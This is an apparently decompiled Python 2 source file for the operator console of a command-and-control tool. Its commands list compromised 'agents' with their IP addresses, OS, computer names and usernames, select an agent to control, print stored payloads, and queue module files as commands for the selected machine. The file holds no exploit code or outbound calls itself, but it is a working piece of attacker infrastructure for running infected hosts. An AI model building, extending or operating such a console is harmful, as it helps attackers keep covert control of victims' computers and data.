# Embedded file name: core\cmd.py
from core import config
from lib import prettytable
from core.color import bcolors
import time
import os

class cmd:
    COMMANDS = ['exit',
     'show',
     'help',
     'list',
     'use',
     'back',
     'payload']
    HELPCOMMANDS = [['exit', 'Exit the console'],
     ['list', 'List all agents'],
     ['help', 'Help menu'],
     ['show', 'Show Command and Controler variables'],
     ['use', 'Interact with AGENT'],
     ['back', 'Back to the main'],
     ['payload', 'Show Payloads'],
     ['load', 'load modules']]

    def help(self, args = None):
        table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
        table.border = False
        table.align = 'l'
        table.add_row(['-------', '-----------'])
        for i in self.HELPCOMMANDS:
            table.add_row([bcolors.OKBLUE + i[0] + bcolors.ENDC, i[1]])

        print table

    def exit(self, args = None):
        os._exit(0)

    def list(self, args = None):
        table = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC,
         bcolors.BOLD + 'Status' + bcolors.ENDC,
         bcolors.BOLD + 'ExternalIP' + bcolors.ENDC,
         bcolors.BOLD + 'InternalIP' + bcolors.ENDC,
         bcolors.BOLD + 'OS' + bcolors.ENDC,
         bcolors.BOLD + 'Arch' + bcolors.ENDC,
         bcolors.BOLD + 'ComputerName' + bcolors.ENDC,
         bcolors.BOLD + 'Username' + bcolors.ENDC])
        table.border = False
        table.align = 'l'
        table.add_row(['--',
         '------',
         '----------',
         '----------',
         '--',
         '----',
         '------------',
         '--------'])
        for i in config.AGENTS:
            status = time.time() - config.TIME[i]
            table.add_row([bcolors.OKBLUE + str(config.AGENTS[i][0]) + bcolors.ENDC,
             status,
             config.AGENTS[i][1],
             config.AGENTS[i][3],
             config.AGENTS[i][2].split('|')[0],
             config.AGENTS[i][4],
             config.AGENTS[i][5],
             config.AGENTS[i][6] + '\\' + config.AGENTS[i][7]])

        print table

    def use(self, args = None):
        if len(args) < 2:
            return
        id = args[1]
        for i in config.AGENTS:
            if id == str(config.AGENTS[i][0]):
                id = i
                config.set_pointer(i)
                break

    def back(self, args = None):
        config.set_pointer('main')

    def payload(self, args = None):
        for i in config.PAYLOADS:
            print i
            print ''

    def show(self, args = None):
        pass

    def load(self, args=None):
        fpm = open('Modules/' + args[1], 'r')
        module = fpm.read()
        config.COMMAND[config.get_pointer()].append(module)
